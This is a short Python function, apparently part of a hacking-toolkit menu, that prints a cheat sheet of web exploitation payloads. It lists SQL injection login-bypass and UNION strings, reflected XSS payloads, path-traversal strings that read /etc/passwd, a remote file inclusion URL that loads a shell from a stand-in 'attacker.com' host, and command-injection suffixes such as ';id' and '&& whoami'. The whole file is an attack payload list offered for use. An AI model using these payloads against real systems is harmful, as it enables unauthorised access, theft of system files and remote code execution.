def web_payloads():
    print("""
=== Web Exploitation Payloads ===

[SQLi – Auth Bypass]
' OR 1=1-- -
admin'-- -

[SQLi – UNION Test]
' UNION SELECT NULL,NULL-- -

[XSS – Reflected]
<script>alert(1)</script>
"><svg/onload=alert(1)>

[LFI – File Inclusion]
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd

[RFI – Test]
http://attacker.com/shell.txt

[Command Injection]
;id
&& whoami
| uname -a
""")
    input("Press Enter to return...")
